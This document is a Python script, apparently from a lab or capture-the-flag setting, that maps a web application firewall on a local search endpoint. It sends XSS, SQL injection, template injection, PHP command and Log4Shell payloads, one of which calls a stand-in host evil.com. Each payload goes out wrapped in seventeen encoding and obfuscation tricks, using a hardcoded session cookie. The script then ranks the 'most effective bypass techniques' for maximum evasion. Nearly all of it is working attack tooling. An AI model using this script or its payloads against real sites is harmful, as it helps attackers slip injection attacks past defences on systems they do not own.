import json
import requests
import urllib.parse
import base64
import re
from urllib.parse import quote, quote_plus

# Target endpoint for testing
target_url = "http://127.0.0.1/search"

# Session cookie from previous authentication
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVf_rg.knB3mHJz708OmX4T2_AH6ScOInc"
cookies = {'session': session_cookie}

# Base payloads to test - common WAF trigger patterns
base_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "' OR '1'='1",
    "1; DROP TABLE users",
    "/etc/passwd",
    "{{7*7}}",
    "<?php system('id'); ?>",
    "${jndi:ldap://evil.com}",
    "../etc/passwd"
]

# Encoding function definitions
def encode_url(payload):
    return quote(payload, safe='')

def encode_url_plus(payload):
    return quote_plus(payload)

def encode_double_url(payload):
    return quote(quote(payload, safe=''), safe='')

def encode_html_entities(payload):
    return ''.join(f'&#{ord(c)};' for c in payload)

def encode_hex_entities(payload):
    return ''.join(f'&#x{ord(c):02x};' for c in payload)

def encode_null_bytes(payload):
    return payload.replace('<', '%00<').replace('>', '%00>')

def encode_mixed_case(payload):
    result = ""
    for i, c in enumerate(payload):
        if c.isalpha() and i % 2 == 0:
            result += c.upper()
        else:
            result += c.lower() if c.isalpha() else c
    return result

def encode_unicode_escape(payload):
    return ''.join(f'\\u{ord(c):04x}' for c in payload)

def encode_base64(payload):
    return base64.b64encode(payload.encode()).decode()

def encode_comment_obfuscation(payload):
    result = ""
    for i, c in enumerate(payload):
        if i % 3 == 0 and i > 0:
            result += "<!-- -->"
        result += c
    return result

def encode_tab_newline(payload):
    return payload.replace(' ', '\t').replace('', '\n')

def encode_unicode_normalization(payload):
    replacements = {
        '<': '\u003c',
        '>': '\u003e',
        '"': '\u0022',
        "'": '\u0027'
    }
    result = payload
    for k, v in replacements.items():
        result = result.replace(k, v)
    return result

def bypass_space_substitution(payload):
    return payload.replace(' ', '/**/')

def encode_overlong_utf8(payload):
    overlong_map = {
        '<': '%C0%BC',
        '>': '%C0%BE'
    }
    result = payload
    for k, v in overlong_map.items():
        result = result.replace(k, v)
    return result

def encode_line_tab(payload):
    return payload.replace('<', '%0d%0a<').replace('>', '%0d%0a>')

def encode_xml_entities(payload):
    xml_map = {
        '<': '&lt;',
        '>': '&gt;',
        '"': '&quot;',
        "'": '&apos;',
        '&': '&amp;'
    }
    result = payload
    for k, v in xml_map.items():
        result = result.replace(k, v)
    return result

# Test execution and results collection
results = []
total_tests = 0
blocked_count = 0
passed_count = 0
errors_count = 0

print("=" * 80)
print("WAF FILTER MAPPING REPORT")
print("=" * 80)
print(f"\nTarget: {target_url}")
print("\n" + "-" * 80)

# Test each base payload with different encodings
for idx, base_payload in enumerate(base_payloads, 1):
    print(f"\n[TEST GROUP {idx}/10] Base Payload: {base_payload[:50]}...")
    print("-" * 80)
    
    # Define encoding tests for this payload
    encoding_tests = [
        ("Original", lambda p: p),
        ("URL Encoding", encode_url),
        ("URL Plus Encoding", encode_url_plus),
        ("Double URL Encoding", encode_double_url),
        ("HTML Entities", encode_html_entities),
        ("Hex Entities", encode_hex_entities),
        ("Null Bytes", encode_null_bytes),
        ("Mixed Case", encode_mixed_case),
        ("Unicode Escape", encode_unicode_escape),
        ("Base64", encode_base64),
        ("Comment Obfuscation", encode_comment_obfuscation),
        ("Tab/Newline", encode_tab_newline),
        ("Unicode Normalization", encode_unicode_normalization),
        ("Space Substitution", bypass_space_substitution),
        ("Overlong UTF-8", encode_overlong_utf8),
        ("Line Tab Injection", encode_line_tab),
        ("XML Entities", encode_xml_entities),
    ]
    
    # Test each encoding
    for enc_name, enc_func in encoding_tests:
        try:
            encoded_payload = enc_func(base_payload)
            data = {'q': encoded_payload}
            
            response = requests.post(
                target_url,
                cookies=cookies,
                data=data,
                timeout=10,
                headers={'User-Agent': 'Mozilla/5.0 (WAF-Test)'}
            )
            
            total_tests += 1
            
            # Determine if blocked
            is_blocked = False
            waf_signature = None
            
            if response.status_code in [403, 406]:
                is_blocked = True
                blocked_count += 1
            elif response.status_code == 400:
                waf_indicators = [
                    'mod_security', 'owasp', 'waf', 'blocked', 'denied', 
                    'security policy', 'suspicious', 'sqli', 'xss', 'attack detected'
                ]
                response_text = response.text.lower()
                for indicator in waf_indicators:
                    if indicator in response_text:
                        is_blocked = True
                        waf_signature = indicator
                        blocked_count += 1
                        break
            elif response.status_code == 500:
                if 'security' in response.text.lower() or 'blocked' in response.text.lower():
                    is_blocked = True
                    blocked_count += 1
            else:
                passed_count += 1
            
            # Store result
            result = {
                'base_payload': base_payload[:30] + '...' if len(base_payload) > 30 else base_payload,
                'encoding': enc_name,
                'encoded_payload': str(encoded_payload)[:50] + '...' if len(str(encoded_payload)) > 50 else str(encoded_payload),
                'status_code': response.status_code,
                'response_length': len(response.text),
                'blocked': is_blocked,
                'waf_signature': waf_signature
            }
            results.append(result)
            
            # Print individual test result
            status = "BLOCKED" if is_blocked else "PASSED"
            print(f"[{status}] {enc_name:<25} | Status: {response.status_code:3} | Length: {len(response.text):5} | Payload: {result['encoded_payload']}")
            
        except Exception as e:
            errors_count += 1
            print(f"[ERROR] {enc_name}: {str(e)[:60]}")
    
    print()

# Calculate statistics
print("=" * 80)
print("COMPREHENSIVE TEST RESULTS SUMMARY")
print("=" * 80)

# Overall statistics
success_rate = (passed_count / total_tests * 100) if total_tests > 0 else 0
block_rate = (blocked_count / total_tests * 100) if total_tests > 0 else 0
error_rate = (errors_count / total_tests * 100) if total_tests > 0 else 0

print(f"\nOverall Test Statistics:")
print(f"  Total Tests Executed:  {total_tests}")
print(f"  Passed (Not Blocked):  {passed_count} ({success_rate:.1f}%)")
print(f"  Blocked by WAF:        {blocked_count} ({block_rate:.1f}%)")
print(f"  Errors:                {errors_count} ({error_rate:.1f}%)")

# Categorize by encoding type
encoding_categories = {}
for result in results:
    enc_type = result['encoding']
    if enc_type not in encoding_categories:
        encoding_categories[enc_type] = {'passed': 0, 'blocked': 0, 'total': 0, 'errors': 0}
    
    if result['blocked']:
        encoding_categories[enc_type]['blocked'] += 1
    else:
        encoding_categories[enc_type]['passed'] += 1
    encoding_categories[enc_type]['total'] += 1

print(f"\n{'Encoding Technique':<30} {'Passed':<8} {'Blocked':<8} {'Total':<8} {'Success Rate':<12}")
print("-" * 80)

for enc_type, stats in sorted(encoding_categories.items()):
    rate = (stats['passed'] / stats['total'] * 100) if stats['total'] > 0 else 0
    print(f"{enc_type:<30} {stats['passed']:<8} {stats['blocked']:<8} {stats['total']:<8} {rate:.1f}%")

# Most successful bypass techniques
successful_techniques = [
    (enc_type, stats['passed'], stats['total']) 
    for enc_type, stats in encoding_categories.items()
    if stats['passed'] > 0
]
successful_techniques.sort(key=lambda x: (x[1], x[2]), reverse=True)

print(f"\n{'='*80}")
print("KEY FINDINGS - WAF FILTER BEHAVIOR ANALYSIS")
print("=" * 80)

print(f"\n1. MOST EFFECTIVE BYPASS TECHNIQUES:")
for i, (technique, passed, total) in enumerate(successful_techniques[:10], 1):
    rate = (passed / total * 100) if total > 0 else 0
    print(f"   {i}. {technique}: {passed}/{total} passed ({rate:.1f}% success)")

# Analyze which payload types are most blocked
payload_analysis = {}
for result in results:
    payload_key = result['base_payload']
    if payload_key not in payload_analysis:
        payload_analysis[payload_key] = {'passed': 0, 'blocked': 0, 'total': 0}
    
    if result['blocked']:
        payload_analysis[payload_key]['blocked'] += 1
    else:
        payload_analysis[payload_key]['passed'] += 1
    payload_analysis[payload_key]['total'] += 1

print(f"\n2. PAYLOAD TYPE SENSITIVITY (Most to Least Blocked):")
sensitive_payloads = sorted(payload_analysis.items(), key=lambda x: x[1]['blocked']/x[1]['total'] if x[1]['total']>0 else 0, reverse=True)
for payload_type, stats in sensitive_payloads:
    sensitivity = (stats['blocked'] / stats['total'] * 100) if stats['total'] > 0 else 0
    print(f"   {payload_type:<30} | Blocked: {stats['blocked']:2}/{stats['total']:2} ({sensitivity:.0f}% sensitivity)")

# Response analysis
print(f"\n{'='*80}")
print("HTTP RESPONSE PATTERN ANALYSIS")
print("=" * 80)

status_codes = {}
response_lengths = []
waf_signatures_found = {}

for result in results:
    status = result['status_code']
    status_codes[status] = status_codes.get(status, 0) + 1
    response_lengths.append(result['response_length'])
    
    if result['waf_signature']:
        sig = result['waf_signature']
        waf_signatures_found[sig] = waf_signatures_found.get(sig, 0) + 1

print(f"\nStatus Code Distribution:")
for code, count in sorted(status_codes.items()):
    percentage = (count / len(results) * 100) if results else 0
    print(f"  HTTP {code}: {count} occurrences ({percentage:.1f}%)")

if response_lengths:
    print(f"\nResponse Length Analysis:")
    print(f"  Min Length: {min(response_lengths)} bytes")
    print(f"  Max Length: {max(response_lengths)} bytes")
    print(f"  Avg Length: {sum(response_lengths) // len(response_lengths)} bytes")

if waf_signatures_found:
    print(f"\nWAF Signatures Detected:")
    for sig, count in waf_signatures_found.items():
        print(f"  '{sig}': {count} times")
else:
    print(f"\nWAF Signatures Detected: None identified")

# Recommendations
print(f"\n{'='*80}")
print("BYPASS VECTOR RECOMMENDATIONS")
print("=" * 80)

recommendations_high = []
recommendations_moderate = []
recommendations_low = []

for enc_type, stats in encoding_categories.items():
    rate = (stats['passed'] / stats['total'] * 100) if stats['total'] > 0 else 0
    
    if rate >= 50:
        recommendations_high.append(f"  ✓ HIGH: {enc_type} ({rate:.1f}% success) - PRIMARY CHOICE")
    elif rate > 0:
        recommendations_moderate.append(f"  ~ MODERATE: {enc_type} ({rate:.1f}% success) - CONDITIONAL USE")
    else:
        recommendations_low.append(f"  ✗ LOW: {enc_type} (0% success) - AVOID")

print("\nEncoding Technique Effectiveness:")
print("\n" + "\n".join(recommendations_high))
print("\n" + "\n".join(recommendations_moderate))
print("\n" + "\n".join(recommendations_low))

print(f"\n\n{'='*80}")
print("PRIORITY BYPASS VECTORS")
print("=" * 80)

print("\nFor Maximum Evasion Success:")
for i, rec in enumerate([r for r in recommendations_high if '✓' in r][:5], 1):
    clean_rec = rec.replace('  ✓ HIGH: ', '').replace(' - PRIMARY CHOICE', '')
    print(f"   {i}. {clean_rec}")

print(f"\n\n{'='*80}")
print("WAF FILTER CHARACTERISTICS INFERRED")
print("=" * 80)

# Infer WAF behavior
if block_rate > 80:
    waf_strength = "STRONG"
    waf_desc = "Blocking most malicious payloads across encoding techniques"
elif block_rate > 50:
    waf_strength = "MODERATE"
    waf_desc = "Blocking common attack patterns but vulnerable to encoding variations"
else:
    waf_strength = "WEAK"
    waf_desc = "Ineffective against most encoding obfuscation techniques"

print(f"\nWAF Strength Assessment: {waf_strength}")
print(f"Description: {waf_desc}")

# Check for specific filtering behaviors
url_encoding_blocks = encoding_categories.get('URL Encoding', {}).get('blocked', 0)
url_encoding_total = encoding_categories.get('URL Encoding', {}).get('total', 1)
html_entity_blocks = encoding_categories.get('HTML Entities', {}).get('blocked', 0)
html_entity_total = encoding_categories.get('HTML Entities', {}).get('total', 1)

print(f"\nFilter Behavior Observed:")
print(f"  - URL Decoding: {'Enabled' if url_encoding_blocks > 0 else 'Possibly Disabled'}")
print(f"  - HTML Entity Decoding: {'Enabled' if html_entity_blocks > 0 else 'Possibly Disabled'}")
print(f"  - Case Sensitivity: {'Insensitive' if encoding_categories.get('Mixed Case', {}).get('blocked', 0) > 0 else 'Sensitive'}")

# Final detailed results table
print(f"\n{'='*80}")
print("DETAILED TEST RESULTS TABLE")
print("=" * 80)
print(f"\n{'Test #':<8} {'Status':<10} {'Encoding':<25} {'Status Code':<12} {'Length':<10} {'Payload Preview'}")
print("-" * 80)

for i, result in enumerate(results[:42], 1):  # Show first 42 for sample
    status = "BLOCKED" if result['blocked'] else "PASSED"
    print(f"{i:<8} {status:<10} {result['encoding']:<25} {result['status_code']:<12} {result['response_length']:<10} {result['encoded_payload']}")

if len(results) > 42:
    print(f"\n... and {len(results) - 42} more test results ...")

# Complete results summary
print(f"\n{'='*80}")
print("COMPLETE RESULTS SUMMARY")
print("=" * 80)
print(f"\nTotal Encoding Techniques Tested: {len(encoding_categories)}")
print(f"Total Test Cases Executed: {total_tests}")
print(f"Successful Bypasses: {passed_count}")
print(f"Blocked Attempts: {blocked_count}")
print(f"Overall Bypass Success Rate: {success_rate:.1f}%")

print(f"\n{'='*80}")
print("END OF COMPREHENSIVE WAF FILTER MAPPING REPORT")
print("=" * 80)

# Summary for programmatic access
summary = {
    'total_tests': total_tests,
    'passed': passed_count,
    'blocked': blocked_count,
    'errors': errors_count,
    'success_rate': round(success_rate, 2),
    'block_rate': round(block_rate, 2),
    'encoding_techniques_tested': len(encoding_categories),
    'successful_techniques': len(recommendations_high),
    'waf_strength': waf_strength
}

print(f"\nJSON Summary:")
print(json.dumps(summary, indent=2))

